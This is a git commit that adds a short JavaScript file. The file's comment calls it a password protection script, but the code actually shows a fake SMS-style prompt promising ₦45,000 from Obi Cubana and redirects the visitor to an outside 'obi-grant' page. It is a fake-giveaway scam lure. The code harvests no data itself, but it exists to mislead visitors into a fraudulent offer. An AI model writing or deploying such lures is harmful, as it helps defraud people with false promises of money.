bc2afa3d7c660aa477924d6e3a2405550eb378c8
itidnewblog4 <ukpehaitid2@gmail.com>
2025-12-27 21:49:51 +0100

    Create obi-active.js

---
+++ obi-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW ₦45,000'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive ₦45,000 new year offer from Obi Cubana. Please press OK to Withdraw.',
+  'WITHDRAW ₦45,000'
+);
+if (password != 'WITHDRAW ₦45,000') {
+  location.href = 'https://phlug.org/obi-grant';
+}
